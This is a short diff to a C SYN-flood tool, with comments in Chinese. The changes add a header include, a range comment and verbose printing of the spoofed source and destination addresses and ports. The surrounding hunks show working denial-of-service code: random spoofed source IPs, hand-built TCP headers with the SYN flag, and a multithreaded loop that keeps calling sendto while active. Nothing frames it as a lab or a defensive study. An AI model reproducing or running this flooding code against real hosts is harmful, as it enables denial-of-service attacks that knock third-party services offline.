@@ -20,6 +20,7 @@
 #include <time.h> 
 #include <arpa/inet.h>
 #include <pthread.h>
+#include <netinet/in.h>
 
 /* 最多线程数 */
 #define MAXCHILD 128
@@ -66,6 +67,7 @@ struct pseudohdr {
 	unsigned short length;
 };
 
+//[begin,end)
 inline long myrandom(int begin, int end) {
 	srand(clock());
 	return rand() % (end - begin) + begin;
@@ -115,6 +117,7 @@ void init_header(struct ip *ip, struct tcphdr *tcp,
 	tcp->sport = htons(rand() % 16383 + 49152);
 	tcp->dport = htons(dst_port);
 	tcp->seq = htonl(rand() % 90000000 + 2345);
+
 	tcp->ack = 0;
 	tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
 	tcp->flag = 0x02;
@@ -151,9 +154,6 @@ send_synflood(void *addr) {
 	/* 处于活动状态时持续发送SYN包 */
 	while (alive) {
 		ip.sourceIP = htonl(myrandom(0xddcccccc, 0xeefefefe));
-		struct in_addr add;
-		add.s_addr = ip.sourceIP;
-		printf("source addr is %s\n", inet_ntoa(add));
 		//计算IP校验和
 		bzero(buf, sizeof(buf));
 		memcpy(buf, &ip, sizeof(struct ip));
@@ -171,7 +171,15 @@ send_synflood(void *addr) {
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip, sizeof(struct ip));
 		memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
-		printf(".");
+
+		struct in_addr add;
+		add.s_addr =ip.sourceIP;
+		printf("source addr is %s:%d\n", inet_ntoa(add),
+				ntohs(tcp.sport));
+		add.s_addr = ip.destIP;
+		printf("dest addr is %s:%d\n", inet_ntoa(add), ntohs(tcp.dport));
+		printf("\n============================\n");
+
 		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr,
 				sizeof(struct sockaddr)) < 0) {
 			perror("sendto()");
